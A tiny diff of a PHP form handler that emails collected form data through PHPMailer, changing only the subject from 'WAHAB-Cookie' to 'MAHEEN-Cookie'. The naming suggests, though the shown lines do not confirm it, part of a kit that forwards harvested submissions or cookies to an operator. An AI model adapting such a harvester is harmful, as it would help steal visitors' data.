@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'WAHAB-Cookie';
+        $mail->Subject = 'MAHEEN-Cookie';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
